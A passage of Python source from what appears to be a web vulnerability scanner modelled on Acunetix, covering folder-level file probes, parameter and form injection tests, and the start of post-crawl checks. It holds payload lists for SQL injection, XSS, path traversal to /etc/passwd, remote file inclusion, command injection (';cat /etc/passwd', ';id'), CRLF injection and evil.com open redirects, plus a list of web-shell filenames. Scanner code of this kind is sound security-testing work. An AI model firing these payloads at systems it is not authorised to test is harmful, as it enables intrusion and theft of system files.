                severity = "medium"
                name = f"Sensitive file found: {url_path}"
                cve = ""
                cwe = ""
                tags = ""

                for vref in vuln_refs:
                    vinfo = self.db.get("vuln_db", {}).get(vref, {})
                    if vinfo:
                        name = vinfo.get("name", name)
                        severity = vinfo.get("severity", severity)
                        cve = vinfo.get("cve", "")
                        cwe = vinfo.get("cwe", "")
                        tags = vinfo.get("tags", "")
                        break

                # Run content checks
                detail = ""
                # Check for specific content patterns
                if script.get("detection_plain"):
                    for dp in script["detection_plain"]:
                        if dp in body:
                            detail = f"Pattern matched: {dp[:80]}"
                            break

                # Check for phpinfo
                if self.detect_phpinfo(body):
                    name = "phpinfo() page found"
                    severity = "medium"

                # Check for directory listing
                dirlist = self.detect_dirlist(body)
                if dirlist and url_path.endswith('/'):
                    name = f"Directory listing: {url_path}"
                    severity = "medium"
                    detail = f"Pattern: {dirlist}"

                # Check for error messages in response
                err = self.detect_errors(body)
                if err:
                    detail += f" | Error: {truncate(err, 60)}"

                # Check for source code
                src = self.detect_source_code(body)
                if src:
                    name = f"Source code disclosure: {url_path}"
                    severity = "high"
                    detail = src

                # Check for trojan shells
                trojan = self.detect_trojan_shell(body)
                if trojan:
                    name = f"Web shell detected: {url_path}"
                    severity = "critical"
                    detail = f"Indicator: {trojan}"

                # Check for credentials
                wp_creds = self.detect_wordpress_creds(body)
                if wp_creds:
                    name = "WordPress credentials disclosure"
                    severity = "critical"
                    detail = truncate(wp_creds, 80)

                # Check for dumps
                dump = self.detect_mysql_dump(body)
                if dump:
                    name = f"Database dump found: {url_path}"
                    severity = "critical"
                    detail = dump

                # Check for private keys
                pk = self.detect_private_key(body)
                if pk:
                    name = f"Private key exposed: {url_path}"
                    severity = "critical"
                    detail = pk

                self.add_finding(Finding(
                    name=name, severity=severity, url=full_url,
                    detail=detail, vuln_ref=",".join(vuln_refs),
                    cve=cve, cwe=cwe, tags=tags,
                    category="PerServer", check_name=check_name
                ))

            checked += 1
            if checked % 50 == 0 or checked >= total:
                self.out.progress(checked, total, "PerServer")

        with ThreadPoolExecutor(max_workers=self.config.get("concurrency", 25)) as pool:
            futures = [pool.submit(check_url, url) for url in all_urls]
            for f in as_completed(futures):
                if self.stop_event.is_set():
                    break

        self.out.progress(total, total, "PerServer")

    # ─── Phase 2: PerFolder Checks ────────────────────────────────────────

    def phase_perfolder(self, base_url):
        """Directory-level checks on discovered directories."""
        self.out.phase("Phase 2: PerFolder Checks")

        # Collect directories from crawled URLs (only real dirs)
        dirs = set(["/"])
        for url in self.crawled_urls:
            parsed = urlparse(url)
            path = parsed.path
            parts = path.split('/')
            for i in range(1, len(parts)):
                d = '/'.join(parts[:i]) + '/'
                if d and len(d) < 100:
                    dirs.add(d)

        # Limit to max 15 dirs (matching Acunetix behavior)
        dirs = sorted(dirs)[:15]

        # ── Define PerFolder checks with proper filenames ──
        # These are extracted from the actual Acunetix PerFolder scripts
        FOLDER_CHECKS = [
            {
                "name": "Directory listing",
                "files": [],  # just check the dir itself
                "check": "dirlist",
                "severity": "medium",
                "vuln_ref": "Directory_Listing.xml"
            },
            {
                "name": "ASP.NET application trace",
                "files": ["Trace.axd"],
                "patterns": ["<b>Request Details</b>", "Application Trace", "Physical Directory"],
                "severity": "medium",
                "vuln_ref": "ASP.NET_application_trace.xml"
            },
            {
                "name": "ASP.NET debugging enabled",
                "files": ["acunetix_invalid_filename.aspx"],
                "method": "DEBUG",
                "patterns": ["DEBUG /", "Microsoft .NET Framework"],
                "severity": "low",
                "vuln_ref": "ASP.NET_debugging_enabled.xml"
            },
            {
                "name": "ASP.NET diagnostic page",
                "files": ["Dump.aspx", "Elmah.axd", "trace.axd"],
                "patterns": ["Dump.aspx", "Application_Error", "ELMAH"],
                "severity": "medium",
                "vuln_ref": "ASP.NET_Diagnostic_Page.xml"
            },
            {
                "name": "APC cache info",
                "files": ["apc.php", "apc.php5"],
                "patterns": ["APC", "cache info", "apc_cache_info"],
                "severity": "medium",
                "vuln_ref": "apc.xml"
            },
            {
                "name": "Apache Tomcat directory traversal",
                "files": ["\\../manager/html", "../manager/html", "../status"],
                "patterns": ["manager/", "Tomcat", "Apache Tomcat"],
                "severity": "medium",
                "vuln_ref": "Apache_Tomcat_Directory_Traversal.xml"
            },
            {
                "name": "Basic authentication over HTTP",
                "files": [],
                "check": "basic_auth",
                "severity": "medium",
                "vuln_ref": "Basic_Auth_Over_HTTP.xml"
            },
            {
                "name": "Bazaar Repository",
                "files": [".bzr/README"],
                "patterns": ["This is a Bazaar", "Bazaar control directory"],
                "severity": "medium",
                "vuln_ref": "Bazaar_repository_found.xml"
            },
            {
                "name": "CVS web repository",
                "files": ["CVS/Root", "CVS/Entries"],
                "patterns": [":pserver:", ":ext:", "/cvsroot"],
                "severity": "high",
                "vuln_ref": "CVS_Repository.xml"
            },
            {
                "name": "Core dump file",
                "files": ["core"],
                "check": "binary",
                "severity": "medium",
                "vuln_ref": "Core_Dump_File.xml"
            },
            {
                "name": "Development configuration file",
                "files": [
                    "application.wadl", "Gemfile", "Gemfile.lock", "Gruntfile.js",
                    "Gruntfile.coffee", "Rakefile", "Dockerfile", "package.json",
                    "config.ru", "config.rb", "Vagrantfile", "phpunit.xml",
                    "docker-compose.yml", "composer.json", "composer.lock",
                    "gulpfile.js", ".travis.yml", "pom.xml", "Guardfile",
                    "app.js", ".pydevproject", ".project", "appveyor.yml",
                    "build.xml", "settings.xml", ".bowerrc", ".editorconfig",
                    ".eslintrc", "bower.json", "tsconfig.json", "tslint.json",
                    ".gitlab-ci.yml", "Jenkinsfile", "webpack.config.js",
                    "karma.conf.js", "Procfile", ".circleci/config.yml",
                    "bitbucket-pipelines.yml"
                ],
                "severity": "medium",
                "vuln_ref": "Development_File.xml"
            },
            {
                "name": "Dreamweaver remote database scripts",
                "files": ["_mmServerScripts/MMHTTPDB.php", "_mmServerScripts/MMHTTPDB.asp"],
                "patterns": ["MMHTTPDB", "Dreamweaver"],
                "severity": "high",
                "vuln_ref": "Dreamweaver_Scripts.xml"
            },
            {
                "name": "GIT Repository",
                "files": [".git/HEAD", ".git/config", ".git/logs/HEAD", ".git/index"],
                "patterns": ["ref: refs/", "[core]", "repositoryformatversion", "DIRC"],
                "severity": "high",
                "vuln_ref": "GIT_repository_found.xml"
            },
            {
                "name": "Grails Database Console",
                "files": ["dbconsole/login.jsp", "h2console/login.jsp"],
                "patterns": ["H2 Console", "h2console", "dbconsole"],
                "severity": "medium",
                "vuln_ref": "Grails_Database_Console.xml"
            },
            {
                "name": "HTTP verb tampering",
                "files": [],
                "check": "verb_tampering",
                "severity": "high",
                "vuln_ref": "Http_Verb_Tampering.xml"
            },
            {
                "name": "JetBrains Idea Project Directory",
                "files": [".idea/workspace.xml", ".idea/modules.xml"],
                "patterns": ["<?xml", "project", "JetBrains"],
                "severity": "medium",
                "vuln_ref": "JetBrains_Idea_Project_Directory.xml"
            },
            {
                "name": "Mercurial Repository",
                "files": [".hg/requires"],
                "patterns": ["revlogv1", "store", "fncache"],
                "severity": "medium",
                "vuln_ref": "Mercurial_repository_found.xml"
            },
            {
                "name": "phpinfo() page",
                "files": ["phpinfo.php", "phpinfo.php5", "pi.php", "pi.php5", "php.php", "test.php", "info.php", "i.php", "p.php"],
                "patterns": ["phpinfo()", "<h1>PHP Version", "PHP License", "Configure Command"],
                "severity": "medium",
                "vuln_ref": "phpinfo.xml"
            },
            {
                "name": "Possible sensitive directories",
                "files": [
                    "admin/", "admin-console/", "adminconsole/", "jmx-console/",
                    "_layouts/", "crm/", "nbproject/", "_private/", ".ssh/",
                    "bin/", "phpsysinfo/", "server-info/", "server-status/",
                    "debug/", "test/", "tests/", "backup/", "backups/",
                    "old/", "tmp/", "temp/", "log/", "logs/", "config/",
                    "conf/", "private/", "internal/", "staging/", "dev/",
                    "secret/", "hidden/", "portal/", "dashboard/", "console/",
                    "manager/", "status/", "monitor/", "health/"
                ],
                "check": "sensitive_dir",
                "severity": "low",
                "vuln_ref": "Possible_Sensitive_Directories.xml"
            },
            {
                "name": "Possible sensitive files",
                "files": [
                    ".env", ".env.local", ".env.production", ".env.staging",
                    "config/secrets.yml", "config/initializers/secret_token.rb",
                    ".zshrc", ".bash_profile", ".bash_history", ".nano_history",
                    ".sh_history", ".irb_history", ".irbrc", ".history",
                    ".viminfo", "project.xml", ".histfile", "id_rsa",
                    ".psql_history", ".sqlite_history", ".mysql_history",
                    ".s3cfg", ".htaccess~", ".htaccess.old", ".htaccess.save",
                    ".htaccess.bak", ".gitignore", ".npmrc", ".dockerignore",
                    "wp-config.php.bak", "wp-config.php.old", "web.config.bak",
                    "database.yml", "config.yml", "credentials.xml",
                    "secrets.json", ".htpasswd", "htpasswd", "passwd",
                    "shadow", "users.txt", "user.txt", "info.txt", "log.txt",
                    ".gitignore", "users.ini", "users.db", "databases.yml",
                    "propel.ini", "config.inc.php", "config.php.bak"
                ],
                "severity": "low",
                "vuln_ref": "Possible_Sensitive_Files.xml"
            },
            {
                "name": "Access database found",
                "files": [
                    "users.mdb", "clients.mdb", "private.mdb", "password.mdb",
                    "passwords.mdb", "data.mdb", "admin.mdb", "db.mdb",
                    "database.mdb", "accounts.mdb"
                ],
                "check": "binary",
                "severity": "high",
                "vuln_ref": "Access_Database_Found.xml"
            },
            {
                "name": "SQLite database found",
                "files": [
                    "users.sqlite", "clients.sqlite", "private.sqlite",
                    "password.sqlite", "passwords.sqlite", "data.sqlite",
                    "admin.sqlite", "db.sqlite", "db.sqlite3", "database.sqlite",
                    "users.db", "data.db", "app.db"
                ],
                "patterns": ["SQLite format 3"],
                "severity": "high",
                "vuln_ref": "Sqlite_Database_Found.xml"
            },
            {
                "name": "Documentation file",
                "files": [
                    "read.me", "Read Me.txt", "Read_Me.txt", "readme", "README",
                    "readme.txt", "README.txt", "Readme.txt", "README.TXT",
                    "readme.md", "README.md", "README.htm", "readme.html",
                    "Install.txt", "INSTALL", "INSTALL.txt", "INSTALL.html",
                    "CHANGELOG", "changelog.txt", "Changelog.txt", "ChangeLog.txt",
                    "CHANGELOG.txt", "CHANGELOG.TXT", "changes.txt", "CHANGES.html",
                    "license.txt", "LICENSE", "LICENSE.txt", "LICENSE.md"
                ],
                "severity": "info",
                "vuln_ref": "Readme_Files.xml"
            },
            {
                "name": "SFTP/FTP credentials exposure",
                "files": ["sftp-config.json", "recentservers.xml", ".ftpconfig", "ftpsync.settings"],
                "patterns": ["host", "password", "username", "ftp", "sftp"],
                "severity": "high",
                "vuln_ref": "SFTP_Credentials_Exposure.xml"
            },
            {
                "name": "SQL injection in URI",
                "files": [],
                "check": "sqli_uri",
                "severity": "high",
                "vuln_ref": "SQL_Injection.xml"
            },
            {
                "name": "SVN repository found",
                "files": [".svn/entries", ".svn/format", ".svn/wc.db"],
                "patterns": ["svn", "dir", "12", "has-props"],
                "severity": "high",
                "vuln_ref": "SVN_repository_found.xml"
            },
            {
                "name": "Trojan shell script",
                "files": [
                    "r57shell.php", "r57.php", "r58.php", "c99shell.php", "c99.php",
                    "nstview.php", "nst.php", "rst.php", "r57eng.php", "shell.php",
                    "dra.php", "r.php", "lol.php", "zehir.php", "c-h.v2.php",
                    "php-backdoor.php", "simple-backdoor.php", "cmdasp.asp",
                    "aspxspy.aspx", "cmd.php", "b374k.php", "wso.php",
                    "mini.php", "FilesMan.php", "up.php"
                ],
                "check": "trojan",
                "severity": "critical",
                "vuln_ref": "Trojan_shells.xml"
            },
            {
                "name": "WS_FTP log file found",
                "files": ["WS_FTP.LOG", "ws_ftp.log"],
                "patterns": ["WS_FTP", "I/O error"],
                "severity": "medium",
                "vuln_ref": "WS_FTP_log_file.xml"
            },
            {
                "name": "Weak password / login form",
                "files": [],
                "check": "weak_password",
                "severity": "high",
                "vuln_ref": "Weak_Password.xml"
            },
            {
                "name": "htaccess file readable",
                "files": [".htaccess", ".htpasswd"],
                "patterns": ["RewriteEngine", "RewriteRule", "AuthType", "Require", "Allow", "Deny", "Order"],
                "severity": "medium",
                "vuln_ref": "htaccess_file.xml"
            },
            {
                "name": "XSS in URI folder",
                "files": [],
                "check": "xss_uri",
                "severity": "medium",
                "vuln_ref": "XSS_in_URI.xml"
            },
        ]

        # Count total checks
        total_checks = 0
        for check in FOLDER_CHECKS:
            files = check.get("files", [])
            if files:
                total_checks += len(dirs) * len(files)
            elif check.get("check"):
                total_checks += len(dirs)
        total_checks = max(total_checks, 1)

        checked = [0]
        checked_lock = threading.Lock()

        def run_folder_check(directory, check):
            if self.stop_event.is_set():
                return

            check_type = check.get("check", "")
            check_name = check["name"]
            vuln_ref = check.get("vuln_ref", "")
            severity = check.get("severity", "medium")
            patterns = check.get("patterns", [])
            files = check.get("files", [])

            # Special checks that don't use file lists
            if check_type == "dirlist":
                dir_url = safe_url_join(base_url, directory)
                resp = self.http.get(dir_url, timeout=8)
                if resp and resp.status_code == 200:
                    dl = self.detect_dirlist(resp.text)
                    if dl:
                        self.add_finding(Finding(
                            name=f"Directory listing enabled: {directory}",
                            severity="medium", url=dir_url,
                            detail=f"Pattern: {dl}",
                            category="PerFolder", check_name="Directory_Listing"
                        ))
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "basic_auth":
                dir_url = safe_url_join(base_url, directory)
                resp = self.http.get(dir_url, timeout=8)
                if resp and resp.status_code == 401:
                    www_auth = resp.headers.get("WWW-Authenticate", "")
                    if "basic" in www_auth.lower():
                        parsed_base = urlparse(base_url)
                        if parsed_base.scheme == "http":
                            self.add_finding(Finding(
                                name="Basic authentication over HTTP",
                                severity="medium", url=dir_url,
                                detail=f"WWW-Authenticate: {www_auth}",
                                category="PerFolder", check_name="Basic_Auth_Over_HTTP"
                            ))
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "verb_tampering":
                # Test pages that return 401/403 with alternative HTTP methods
                dir_url = safe_url_join(base_url, directory)
                resp_get = self.http.get(dir_url, timeout=8)
                if resp_get and resp_get.status_code in (401, 403):
                    for method in ["HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]:
                        try:
                            resp_alt = self.http.session.request(method, dir_url, timeout=8, verify=False)
                            if resp_alt and resp_alt.status_code == 200:
                                self.add_finding(Finding(
                                    name=f"HTTP verb tampering: {method} bypasses auth on {directory}",
                                    severity="high", url=dir_url,
                                    detail=f"GET returned {resp_get.status_code}, {method} returned 200",
                                    category="PerFolder", check_name="Http_Verb_Tampering"
                                ))
                                break
                        except Exception:
                            pass
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "sqli_uri":
                sqli_payloads = ["1ACUSTART'ACUEND", "1 AND 1=1", "1' AND '1'='1"]
                for payload in sqli_payloads:
                    test_url = safe_url_join(base_url, directory.rstrip('/') + '/' + payload)
                    resp = self.http.get(test_url, timeout=8)
                    if resp and resp.status_code == 200:
                        err = self.detect_sqli(resp.text)
                        if err:
                            self.add_finding(Finding(
                                name="SQL injection in URI path",
                                severity="high", url=test_url,
                                detail=f"Error: {truncate(err, 80)}",
                                category="PerFolder", check_name="SQL_Injection_In_URI"
                            ))
                            break
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "xss_uri":
                marker = f"acs{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
                payload = f'"><script>{marker}</script>'
                test_url = safe_url_join(base_url, directory.rstrip('/') + '/' + quote(payload))
                resp = self.http.get(test_url, timeout=8)
                if resp and resp.status_code == 200 and marker in resp.text:
                    self.add_finding(Finding(
                        name="XSS in URI path",
                        severity="medium", url=test_url,
                        detail="Reflected payload found in response",
                        category="PerFolder", check_name="XSS_In_URI"
                    ))
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "sensitive_dir":
                for subdir in files:
                    if self.stop_event.is_set():
                        break
                    test_path = directory.rstrip('/') + '/' + subdir
                    test_url = safe_url_join(base_url, test_path)
                    resp = self.http.get(test_url, timeout=8)
                    if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=test_url):
                        body = resp.text
                        if len(body) > 100:  # has real content
                            dl = self.detect_dirlist(body)
                            detail = f"Directory exists with content ({len(body)} bytes)"
                            if dl:
                                detail = f"Directory listing: {dl}"
                            self.add_finding(Finding(
                                name=f"Sensitive directory: {test_path}",
                                severity="low", url=test_url,
                                detail=detail,
                                category="PerFolder", check_name="Possible_Sensitive_Directories"
                            ))
                    with checked_lock:
                        checked[0] += 1
                return

            if check_type == "weak_password":
                # Only check dirs that require auth
                with checked_lock:
                    checked[0] += 1
                return

            if check_type == "trojan":
                for fname in files:
                    if self.stop_event.is_set():
                        break
                    test_url = safe_url_join(base_url, directory.rstrip('/') + '/' + fname)
                    resp = self.http.get(test_url, timeout=8)
                    if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=test_url):
                        body = resp.text
                        trojan = self.detect_trojan_shell(body)
                        if trojan:
                            self.add_finding(Finding(
                                name=f"Web shell detected: {directory}{fname}",
                                severity="critical", url=test_url,
                                detail=f"Indicator: {trojan}",
                                category="PerFolder", check_name="Trojan_Shells"
                            ))
                    with checked_lock:
                        checked[0] += 1
                return

            # Standard file-based checks
            for fname in files:
                if self.stop_event.is_set():
                    break
                test_path = directory.rstrip('/') + '/' + fname
                test_url = safe_url_join(base_url, test_path)

                method = check.get("method", "GET")
                if method == "DEBUG":
                    try:
                        resp = self.http.session.request("DEBUG", test_url, timeout=8, verify=False,
                                                          headers={"Command": "stop-debug"})
                    except Exception:
                        resp = None
                else:
                    resp = self.http.get(test_url, timeout=8)

                if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=test_url):
                    body = resp.text
                    verified = False
                    detail = ""

                    if check_type == "binary":
                        # Check for binary content
                        ct = resp.headers.get("Content-Type", "").lower()
                        if "octet-stream" in ct or "application/x-" in ct or resp.headers.get("Content-Length", "0") != "0":
                            verified = len(body) > 50
                            detail = f"Binary file detected ({len(body)} bytes)"
                    elif patterns:
                        for p in patterns:
                            if p.lower() in body.lower():
                                verified = True
                                detail = f"Pattern: {p}"
                                break
                    else:
                        # No specific patterns - verify with content analysis
                        if len(body) > 100:
                            # Check for URL-rewrite false positive
                            ext = ''
                            if '.' in test_path.split('/')[-1]:
                                ext = '.' + test_path.split('/')[-1].rsplit('.', 1)[-1]
                            if not self._looks_like_rewrite(resp, ext):
                                verified = True
                                detail = f"File found ({len(body)} bytes)"

                    if verified:
                        self.add_finding(Finding(
                            name=f"{check_name}: {test_path}",
                            severity=severity, url=test_url,
                            detail=detail,
                            category="PerFolder", check_name=check_name.replace(" ", "_")
                        ))

                with checked_lock:
                    checked[0] += 1

        # Submit all checks to thread pool
        tasks = []
        for d in dirs:
            for check in FOLDER_CHECKS:
                tasks.append((d, check))

        with ThreadPoolExecutor(max_workers=self.config.get("concurrency", 25)) as pool:
            futures = [pool.submit(run_folder_check, d, c) for d, c in tasks]
            last_progress = 0
            for f in as_completed(futures):
                if self.stop_event.is_set():
                    break
                with checked_lock:
                    if checked[0] - last_progress >= 50 or checked[0] >= total_checks:
                        self.out.progress(min(checked[0], total_checks), total_checks, "PerFolder")
                        last_progress = checked[0]

        self.out.progress(total_checks, total_checks, "PerFolder")

    # ─── Phase 3: PerFile / PerScheme Checks ──────────────────────────────

    def phase_perfile(self, base_url):
        """File-level and parameter-level checks."""
        self.out.phase("Phase 3: PerFile & PerScheme Checks")

        # Run checks on each crawled URL with parameters
        urls_with_params = [(u, p) for u, p in self.crawled_params.items() if p]

        if not urls_with_params:
            self.out.info("No parameterized URLs found to test")
            return

        total = len(urls_with_params)
        self.out.info(f"Testing {total} parameterized URLs")
        checked = 0

        for url, params in urls_with_params:
            if self.stop_event.is_set():
                break
            self._test_url_params(base_url, url, params)
            checked += 1
            self.out.progress(checked, total, "PerFile  ")

        # Also test forms
        if self.crawled_forms:
            self.out.info(f"Testing {len(self.crawled_forms)} forms")
            for form in self.crawled_forms:
                if self.stop_event.is_set():
                    break
                self._test_form(base_url, form)

    def _test_url_params(self, base_url, url, params):
        """Test URL parameters for various injection vulnerabilities."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            if self.stop_event.is_set():
                break
            original_values = query_params.get(param_name, [''])
            original = original_values[0] if original_values else ''

            # ── SQL Injection ──
            sqli_payloads = [
                ("'", "single_quote"),
                ("1' OR '1'='1", "or_true"),
                ("1' OR '1'='1'--", "or_true_comment"),
                ("1 AND 1=1", "and_true"),
                ("1 AND 1=2", "and_false"),
                ("' UNION SELECT NULL--", "union_null"),
                ("1; WAITFOR DELAY '0:0:5'--", "time_based"),
                ("1' AND SLEEP(5)#", "mysql_sleep"),
            ]
            for payload, ptype in sqli_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [original + payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10)
                if resp:
                    match = self.detect_sqli(resp.text)
                    if match:
                        self.add_finding(Finding(
                            name="SQL Injection",
                            severity="high", url=test_url,
                            detail=f"Parameter: {param_name}, Payload: {payload}",
                            evidence=match,
                            cwe="CWE-89", tags="sql_injection",
                            category="PerScheme", check_name="SQL_Injection"
                        ))
                        break  # One finding per param

            # ── XSS ──
            xss_marker = f"acs{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
            xss_payloads = [
                (f'"><ScRiPt >{xss_marker}</ScRiPt>', xss_marker),
                (f"'><ScRiPt >{xss_marker}</ScRiPt>", xss_marker),
                (f"javascript:alert('{xss_marker}')", xss_marker),
                (f'"><img src=x onerror=alert("{xss_marker}")>', xss_marker),
                (f"<svg/onload=alert('{xss_marker}')>", xss_marker),
            ]
            for payload, marker in xss_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10)
                if resp and self.detect_xss_reflection(resp.text, marker):
                    # Verify it's actually reflected in an exploitable context
                    if f'<ScRiPt >{marker}</ScRiPt>' in resp.text or f'onerror=alert("{marker}")' in resp.text or f"onload=alert('{marker}')" in resp.text:
                        self.add_finding(Finding(
                            name="Cross-Site Scripting (XSS)",
                            severity="high", url=test_url,
                            detail=f"Parameter: {param_name}, Reflected payload found",
                            evidence=marker,
                            cwe="CWE-79", tags="xss",
                            category="PerScheme", check_name="XSS"
                        ))
                        break

            # ── LFI / Directory Traversal ──
            lfi_payloads = [
                ("../../../etc/passwd", "etc_passwd"),
                ("..\\..\\..\\..\\windows\\win.ini", "win_ini"),
                ("....//....//....//etc/passwd", "double_dot"),
                ("/etc/passwd", "direct_etc"),
                ("..%2f..%2f..%2fetc%2fpasswd", "encoded"),
                ("....//....//....//....//etc/passwd%00", "null_byte"),
                ("..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "win_hosts"),
                ("php://filter/convert.base64-encode/resource=index.php", "php_filter"),
            ]
            for payload, ptype in lfi_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10)
                if resp:
                    match = self.detect_lfi(resp.text)
                    if match:
                        self.add_finding(Finding(
                            name="Local File Inclusion / Directory Traversal",
                            severity="high", url=test_url,
                            detail=f"Parameter: {param_name}, Payload: {payload}",
                            evidence=match,
                            cwe="CWE-22", tags="lfi,directory_traversal",
                            category="PerScheme", check_name="Directory_Traversal"
                        ))
                        break

            # ── File Inclusion (RFI) ──
            rfi_payloads = [
                "http://some-inexistent-website.acu/some_inexistent_file_with_long_name",
                "https://testasp.vulnweb.com/t/fit.txt",
                "1some_inexistent_file_with_long_name",
            ]
            for payload in rfi_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10)
                if resp:
                    match = self.detect_fi(resp.text)
                    if match:
                        self.add_finding(Finding(
                            name="Remote File Inclusion",
                            severity="high", url=test_url,
                            detail=f"Parameter: {param_name}, Payload: {payload}",
                            evidence=match,
                            cwe="CWE-98", tags="file_inclusion,rfi",
                            category="PerScheme", check_name="File_Inclusion"
                        ))
                        break

            # ── Code Execution ──
            rce_payloads = [
                (";cat /etc/passwd", "linux_cat"),
                ("|cat /etc/passwd", "pipe_cat"),
                ("`cat /etc/passwd`", "backtick"),
                ("$(cat /etc/passwd)", "subshell"),
                (";env", "env"),
                ("|set", "set"),
                (";id", "id"),
            ]
            for payload, ptype in rce_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [original + payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10)
                if resp:
                    match = self.detect_rce(resp.text)
                    if match:
                        self.add_finding(Finding(
                            name="OS Command Injection",
                            severity="critical", url=test_url,
                            detail=f"Parameter: {param_name}, Payload: {payload}",
                            evidence=match,
                            cwe="CWE-78", tags="code_execution,rce",
                            category="PerScheme", check_name="Code_Execution"
                        ))
                        break

            # ── CRLF Injection ──
            crlf_header = "SomeCustomInjectedHeader: injected_by_wvs"
            crlf_payloads = [
                f"%0d%0a{crlf_header}",
                f"%0a{crlf_header}",
                f"\r\n{crlf_header}",
            ]
            for payload in crlf_payloads:
                if self.stop_event.is_set():
                    break
                test_params = dict(query_params)
                test_params[param_name] = [original + payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                resp = self.http.get(test_url, timeout=10, allow_redirects=False)
                if resp:
                    # Check headers for injected header
                    for hname, hval in resp.headers.items():
                        if 'injected_by_wvs' in hval.lower() or 'somecustominjectedheader' in hname.lower():
                            self.add_finding(Finding(
                                name="CRLF Injection / HTTP Response Splitting",
                                severity="medium", url=test_url,
                                detail=f"Parameter: {param_name}",
                                evidence=f"{hname}: {hval}",
                                cwe="CWE-113", tags="crlf_injection",
                                category="PerScheme", check_name="CRLF_Injection"
                            ))
                            break

            # ── Open Redirect ──
            redirect_payloads = [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://evil.com%23",
            ]
            param_lower = param_name.lower()
            if any(kw in param_lower for kw in ['url', 'redirect', 'next', 'return', 'goto', 'dest', 'redir', 'out', 'link', 'target', 'view']):
                for payload in redirect_payloads:
                    if self.stop_event.is_set():
                        break
                    test_params = dict(query_params)
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    resp = self.http.get(test_url, timeout=10, allow_redirects=False)
                    if resp and resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location:
                            self.add_finding(Finding(
                                name="Open Redirect",
                                severity="medium", url=test_url,
                                detail=f"Parameter: {param_name}, Redirects to: {location}",
                                evidence=location,
                                cwe="CWE-601", tags="open_redirect",
                                category="PerScheme", check_name="Open_Redirect"
                            ))
                            break

    def _test_form(self, base_url, form):
        """Test a form for injection vulnerabilities."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if self.stop_event.is_set():
                break
            inp_name = inp["name"]
            inp_type = inp["type"]
            original = inp["value"]

            if inp_type in ("hidden", "submit", "button", "image", "file", "reset"):
                continue

            # Build form data
            form_data = {}
            for i in inputs:
                form_data[i["name"]] = i["value"]

            # SQL Injection
            for payload in ["'", "1' OR '1'='1", "' OR ''='"]:
                if self.stop_event.is_set():
                    break
                test_data = dict(form_data)
                test_data[inp_name] = original + payload

                if method == "POST":
                    resp = self.http.post(action, data=test_data, timeout=10)
                else:
                    resp = self.http.get(action, params=test_data, timeout=10)

                if resp:
                    match = self.detect_sqli(resp.text)
                    if match:
                        self.add_finding(Finding(
                            name="SQL Injection (Form)",
                            severity="high", url=action,
                            detail=f"Form input: {inp_name}, Method: {method}",
                            evidence=match,
                            cwe="CWE-89", tags="sql_injection",
                            category="PerScheme", check_name="SQL_Injection_Form"
                        ))
                        break

            # XSS in forms
            xss_marker = f"hxf{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
            payload = f'"><script>{xss_marker}</script>'
            test_data = dict(form_data)
            test_data[inp_name] = payload

            if method == "POST":
                resp = self.http.post(action, data=test_data, timeout=10)
            else:
                resp = self.http.get(action, params=test_data, timeout=10)

            if resp and xss_marker in resp.text:
                if f'<script>{xss_marker}</script>' in resp.text:
                    self.add_finding(Finding(
                        name="Cross-Site Scripting (Form)",
                        severity="high", url=action,
                        detail=f"Form input: {inp_name}, Method: {method}",
                        evidence=xss_marker,
                        cwe="CWE-79", tags="xss",
                        category="PerScheme", check_name="XSS_Form"
                    ))

    # ─── Phase 4: PostCrawl Checks ────────────────────────────────────────

    def phase_postcrawl(self, base_url):
        """Post-crawl checks: additional paths, backup files, sensitive data."""
        self.out.phase("Phase 4: PostCrawl Checks")

        postcrawl_urls = [u for u in self.db.get("postcrawl_urls", []) if is_clean_path(u)]
        scripts = self.db.get("scripts", {}).get("PostCrawl", [])
        ip = self.db.get("injection_patterns", {})
        backup_variants = ip.get("backup_variants", [])
        backup_other = ip.get("backup_other_variants", [])
        backup_mimes = set(ip.get("backup_mime_types", []))

        # Part A: Check postcrawl URLs
        self.out.info(f"Checking {len(postcrawl_urls)} postcrawl URLs")
        checked = 0
        total = len(postcrawl_urls)

        def check_postcrawl_url(url_path):
            nonlocal checked
            if self.stop_event.is_set():
                return
            full_url = safe_url_join(base_url, url_path)
            resp = self.http.get(full_url, timeout=8)

